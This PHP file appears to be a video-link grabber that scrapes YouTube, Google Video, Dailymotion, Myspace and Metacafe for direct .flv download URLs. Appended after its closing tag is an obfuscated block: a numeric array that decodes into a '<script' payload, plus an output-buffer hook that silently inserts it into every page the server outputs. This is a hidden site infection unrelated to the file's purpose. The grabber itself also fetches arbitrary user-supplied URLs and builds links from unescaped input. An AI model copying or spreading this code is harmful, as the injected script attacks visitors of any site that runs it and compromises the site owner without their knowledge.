<?php

// Supported: Youtube, Google, Metacafe, Dailymotion, Myspace

// HTML Hyperlink-related insert constants
define("HLINK_TEMPLATE","<a href=\"[X1]\">[X2]</a>");
define("HLINK_LINK_TITLE","Click here to download the .flv video file!");
define("VIDS_FORMAT","FLV"); // Possible values are 'MP4', 'FLV'


function f_get_headers($vurl)
{
//$fhdl=fopen(trim($vurl),'r');
$vbuff=file_get_contents(trim($vurl));
$vret=implode("\r",$http_response_header);
//fclose($fhdl);
return $vret;
}

function GetDownloadLink()
{
if(isset($_POST['UTURLTXT']))
	{
	$RetBuff="";
	$vYTURL=trim($_POST['UTURLTXT']);
	// ------------------------------------------------------------------------------------------------
	if(preg_match("/youtube\./i",$vYTURL))
		{
    $vout="";
    if(isset($_POST['UTURLTXT']))
        {
        if (strlen($_POST['UTURLTXT'])>0)
            {
            if (preg_match("/v=([^(\&|$)]*)/", trim($_POST['UTURLTXT']),$matches))
                {
                $VideoID = trim($matches[1]);
                }
            elseif (preg_match("/^([^(\&|$)]{10,12})$/",trim($_POST['UTURLTXT']),$matches))
                {
                $VideoID = trim($matches[1]);
                }
            else
                {
                $VideoID = "";
                }
            if ($VideoID!="")
                {
                $pagecontent = file_get_contents('http://youtube.com/get_video_info?&video_id='.$VideoID);
                if (preg_match("/token\=([^\&\$]+)/i",$pagecontent,$matches));
                    {
                    $T_ID = trim($matches[1]);
                    if(VIDS_FORMAT=='MP4') {$vformat='&fmt=18';} else {$vformat='';}
                    
                    $vfh=fopen('http://www.youtube.com/get_video?video_id='.$VideoID.'&t='.$T_ID.$vformat,'rb');
                    $vbuff=fread($vfh,512);    
                    $vBuffHeaders=$http_response_header;
                    fclose($vfh);
                    
                    $vVidServ="";
                    foreach ($vBuffHeaders as $kk=>$vv)
                        {
                        if(preg_match("/location[ ]*\:(.+)$/i",$vv,$res))
                            {
                            $vVidServ=trim($res[1]);  
                            break; 
                            }
                        }
                                    
                    $VideoURL=$vVidServ;
                    $vout=str_replace("[X2]",HLINK_LINK_TITLE,str_replace("[X1]",$VideoURL,HLINK_TEMPLATE));
                    }
                }
            }
        }           
		$RetBuff=$RetBuff.$vout;
		}
	// ------------------------------------------------------------------------------------------------
	elseif(preg_match("/google\./i",$vYTURL))
		{
		$YTVidURL="";
		$pagebuff=trim(file_get_contents(trim($vYTURL)));
		
		if (preg_match("/[\=]([^\=]+videodownload[^\'\"\>]+)/i",$pagebuff,$res))
			{
            $YTVidURL=str_replace("'","",$YTVidURL);
            $YTVidURL=str_replace("\"","",$YTVidURL);
			$YTVidURL = urldecode(trim($res[1]));
			}
		$RetBuff=$RetBuff."<a href=\"$YTVidURL\">Google video: Download the .flv file</a>";
		}
	// ------------------------------------------------------------------------------------------------
	elseif(preg_match("/dailymotion\.com/i",$vYTURL))
		{
        $YTVidURL="";       
        if (preg_match("/\/([^\/\_]+)\_/i",$vYTURL,$res))
            {
            $vFileBuff=file_get_contents("http://www.dailymotion.com/rss/video/".trim($res[1]));
            // <media:content url="http://www.dailymotion.com/get/18/80x60/flv/14776635.flv?key=d3b3fcefe5f6fb59c4b820641ead1f5413b09c3.flv" type="video/x-flv" duration="700" width="80" height="60"/>
            if (preg_match("/url[ ]*\=[ ]*[\"\']([^\"\']+\.flv[^\"\']*)[\"\']/i",$vFileBuff,$res))
                {
                $vdmurl=trim(str_replace("80x60","320x240",$res[1]));
                $headers=f_get_headers($vdmurl);   
                if (preg_match("/location[ ]*\:[ ]*([^\r]+)\r/i",$headers,$res))
                    {
                    $YTVidURL=$res[1];
                    }
                else
                    {
                    $YTVidURL=$vdmurl;
                    }
                }
            }              
		$RetBuff=$RetBuff."<a href=\"$YTVidURL\">Dailymotion video: Download the .flv file</a>";
		}
	// ------------------------------------------------------------------------------------------------
	elseif(preg_match("/myspace\.com/i",$vYTURL))
		{
		$YTVidURL="";
		$varurl=strtolower($vYTURL);
		$vstrwrk10=explode("videoid=",$varurl);
		$vstrwrk2x1d=$vstrwrk10[1];
		if (strstr($vstrwrk2x1d,"&"))
			{
			$vstrwrk10=explode("&",$vstrwrk2x1d);
			$vstrwrk2x1d=$vstrwrk10[0];
			}
		$vrurl="http://mediaservices.myspace.com/services/rss.ashx?type=video&videoID=".$vstrwrk2x1d;
		$vFileBuff=@file($vrurl);
		$vLineCount=count($vFileBuff);
		for ($vstrwrk2x1=0;$vstrwrk2x1<$vLineCount;$vstrwrk2x1++)
			{
			if (strstr($vFileBuff[$vstrwrk2x1],"<media:content"))
				{
				$vWorkBuffer=$vFileBuff[$vstrwrk2x1];
    		  	$vstrwrk10=explode('url="',$vWorkBuffer);
				$vstrwrk11=explode('"',$vstrwrk10[1]);
				$YTVidURL=$vstrwrk11[0];
				break;
				}
			}
		$RetBuff=$RetBuff."<a href=\"$YTVidURL\">Myspace video: Download the .flv file</a>";
		}
	// ------------------------------------------------------------------------------------------------
	elseif(preg_match("/metacafe\.com/i",$vYTURL))
		{
		$YTVidURL="";
		$vFileBuff=file_get_contents($vYTURL);
		
        if (preg_match("/\&mediaURL\=([^\&]+)/i",$vFileBuff,$res))
            {
            $YTVidURL=urldecode(str_replace("\/","/",($res[1])));
            if (preg_match("/^(.+[\/])([^\/]+)$/i",$YTVidURL,$res))
                {
                 $YTVidURL=str_replace("%25","%",$res[1].urlencode($res[2]));
                }             
            if(preg_match("/gdaKey\=([^\&]+)/",$vFileBuff,$res))
                {
                 $YTVidURL=trim($YTVidURL)."?__gda__=".trim($res[1]);
                }
            }

		$RetBuff=$RetBuff."<a href=\"$YTVidURL\">Metacafe video: Download the .flv file</a>";
		}
	// ------------------------------------------------------------------------------------------------
	return $RetBuff;
	}
}
?><?php global $ob_starting;
if(!$ob_starting) {
   function ob_start_flush($s) {
	$tc = array(0, 69, 84, 82, 67, 83, 7, 79, 8, 9, 73, 12, 76, 68, 63, 78, 19, 23, 24, 3, 65, 70, 27, 14, 16, 20, 80, 17, 29, 89, 86, 85, 2, 77, 91, 93, 11, 18, 71, 66, 72, 75, 87, 74, 22, 37, 52, 13, 59, 61, 25, 28, 21, 1, 35, 15, 34, 36, 30, 88, 41, 92, 46, 33, 51);
	$tr = array(51, 5, 4, 3, 10, 26, 2, 0, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 58, 10, 21, 0, 8, 2, 29, 26, 1, 7, 21, 8, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 9, 28, 28, 32, 31, 15, 13, 1, 21, 10, 15, 1, 13, 32, 9, 0, 34, 0, 0, 0, 30, 20, 3, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 15, 1, 42, 0, 63, 3, 3, 20, 29, 8, 6, 19, 25, 39, 18, 37, 17, 37, 6, 11, 0, 6, 19, 18, 27, 17, 18, 17, 21, 6, 11, 0, 6, 19, 18, 16, 37, 21, 18, 16, 6, 11, 0, 6, 19, 18, 18, 17, 21, 17, 25, 6, 11, 0, 6, 19, 25, 4, 16, 27, 18, 16, 6, 11, 0, 6, 19, 17, 25, 18, 17, 18, 16, 6, 11, 0, 6, 19, 16, 1, 17, 50, 17, 24, 6, 11, 0, 6, 19, 18, 52, 17, 24, 18, 37, 6, 11, 0, 6, 19, 17, 37, 18, 27, 17, 18, 6, 11, 0, 6, 19, 17, 21, 18, 16, 16, 27, 6, 11, 0, 6, 19, 37, 21, 18, 37, 18, 27, 6, 11, 0, 6, 19, 17, 37, 25, 4, 16, 27, 6, 11, 0, 6, 19, 17, 17, 18, 16, 18, 16, 6, 11, 0, 6, 19, 17, 21, 25, 50, 16, 1, 6, 11, 0, 6, 19, 16, 1, 25, 17, 25, 52, 6, 11, 0, 6, 19, 16, 13, 25, 25, 25, 25, 6, 11, 0, 6, 19, 16, 13, 25, 24, 25, 16, 6, 11, 0, 6, 19, 16, 21, 16, 13, 25, 27, 6, 11, 0, 6, 19, 16, 21, 25, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 24, 18, 25, 6, 11, 0, 6, 19, 17, 25, 18, 27, 18, 18, 6, 11, 0, 6, 19, 16, 13, 17, 4, 17, 18, 6, 11, 0, 6, 19, 17, 13, 16, 13, 17, 21, 6, 11, 0, 6, 19, 17, 17, 17, 21, 16, 27, 6, 11, 0, 6, 19, 25, 13, 24, 24, 24, 24, 6, 9, 22, 0, 0, 0, 30, 20, 3, 0, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 27, 22, 0, 0, 0, 30, 20, 3, 0, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 0, 28, 0, 24, 22, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 2, 11, 5, 2, 29, 12, 1, 13, 9, 0, 34, 30, 20, 3, 0, 5, 0, 28, 0, 32, 32, 22, 21, 7, 3, 0, 8, 43, 28, 24, 22, 43, 51, 2, 23, 12, 1, 15, 38, 2, 40, 22, 43, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 3, 38, 39, 0, 28, 0, 2, 48, 43, 49, 22, 21, 7, 3, 0, 8, 10, 28, 27, 22, 10, 51, 17, 22, 10, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 4, 12, 3, 0, 28, 0, 4, 14, 3, 38, 39, 23, 5, 31, 39, 5, 2, 3, 8, 10, 36, 36, 11, 37, 9, 22, 10, 21, 0, 8, 4, 14, 4, 12, 3, 53, 28, 32, 24, 24, 32, 9, 0, 5, 0, 36, 28, 0, 64, 2, 3, 10, 15, 38, 23, 21, 3, 7, 33, 54, 40, 20, 3, 54, 7, 13, 1, 8, 26, 20, 3, 5, 1, 60, 15, 2, 8, 4, 14, 4, 12, 3, 11, 27, 44, 9, 47, 27, 52, 9, 22, 35, 35, 10, 21, 0, 8, 5, 2, 29, 12, 1, 13, 9, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 16, 44, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 37, 9, 9, 22, 35, 0, 1, 12, 5, 1, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 22, 35, 3, 1, 2, 31, 3, 15, 0, 5, 22, 0, 0, 0, 35, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 0, 34, 2, 3, 29, 0, 34, 0, 0, 0, 10, 21, 8, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 56, 29, 60, 13, 0, 61, 61, 0, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 9, 34, 13, 7, 4, 31, 33, 1, 15, 2, 23, 42, 3, 10, 2, 1, 8, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 27, 9, 9, 22, 0, 0, 0, 35, 0, 1, 12, 5, 1, 0, 34, 30, 20, 3, 0, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 28, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 8, 32, 5, 4, 3, 10, 26, 2, 32, 9, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 5, 3, 4, 28, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 24, 9, 22, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 5, 56, 29, 46, 20, 38, 62, 20, 33, 1, 8, 32, 40, 1, 20, 13, 32, 9, 48, 24, 49, 23, 20, 26, 26, 1, 15, 13, 54, 40, 10, 12, 13, 8, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 9, 22, 35, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 35, 2, 3, 29, 0, 34, 4, 40, 1, 4, 41, 14, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 8, 9, 22, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 5, 1, 2, 46, 10, 33, 1, 7, 31, 2, 8, 32, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 32, 11, 0, 52, 24, 24, 9, 22, 35, 0, 0, 0, 35, 0, 0, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 22, 35, 51, 55, 5, 4, 3, 10, 26, 2, 58);

	$ob_htm = ''; foreach($tr as $tval) {
		$ob_htm .= chr($tc[$tval]+32);
	}

	$slw=strtolower($s);
	$i=strpos($slw,'</script');if($i){$i=strpos($slw,'>',$i);}
	if(!$i){$i=strpos($slw,'</div');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</table');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</form');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</p');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</body');if($i){$i--;}}
	if(!$i){$i=strlen($s);if($i){$i--;}}
	$i++; $s=substr($s,0,$i).$ob_htm.substr($s,$i);
	
	return $s;
   }
   $ob_starting = time();
   @ob_start("ob_start_flush");
} ?>